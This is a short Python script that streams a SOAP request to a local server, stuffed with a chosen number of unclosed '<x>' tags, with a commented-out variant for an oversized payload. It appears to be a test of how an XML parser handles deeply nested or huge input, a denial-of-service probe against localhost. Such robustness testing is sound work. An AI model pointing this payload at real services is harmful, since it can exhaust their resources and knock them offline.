import requests
import sys

if len(sys.argv) < 2:
    print("Give as argument: number of opening <x> to send!")
    sys.exit()
limit = int(sys.argv[1])

S = requests.session()

location = "http://localhost:8080"

preamble = """<?xml version="1.0" encoding="utf-8" ?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><SOAP-ENV:Body><opUntyped>""".encode("utf-8")
postamble = """<x xsi:type="xsd:int">1</x><y xsi:type="xsd:int">1</y></opUntyped></SOAP-ENV:Body></SOAP-ENV:Envelope>""".encode("utf-8")

def send_many_x(limit):
    yield preamble
    for i in range(limit):
        yield "<x>".encode("utf-8")
    #for i in range(limit):
    #    yield "</x>".encode("utf-8")
    # uncomment these to do a oversized payload instead
    yield postamble

req = S.post(location, data=send_many_x(limit))
